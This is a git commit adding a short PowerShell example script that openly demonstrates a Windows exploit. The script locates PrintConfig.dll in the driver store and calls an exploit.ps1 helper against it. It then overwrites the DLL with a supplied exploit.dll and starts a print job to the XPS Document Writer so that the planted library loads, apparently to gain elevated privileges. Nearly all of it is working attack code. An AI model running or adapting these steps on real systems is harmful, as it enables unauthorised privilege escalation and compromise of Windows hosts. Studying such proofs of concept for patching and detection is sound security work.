483c5e464e1a1e7998189e93539b301ee05a27b3
Liam Glanfield <OneLogicalMyth@users.noreply.github.com>
2018-09-10 17:36:55 +0100

    inital commit

---
+++ example.ps1
@@ -0,0 +1,14 @@
+
+# exploit
+$Target = (get-item 'C:\windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_*\Amd64\PrintConfig.dll').fullname
+.\exploit.ps1 -TargetFile $Target -TaskFolder ExploitDemo
+
+# overwrite file with dll
+Copy-Item exploit.dll $Target
+
+# trigger print job
+Add-Type -AssemblyName System.Printing
+$PrintServer = new-object System.Printing.PrintServer
+$Queue = $server.GetPrintQueue('Microsoft XPS Document Writer')
+$Job = $Queue.AddJob()
+$Job.JobStream.Close()
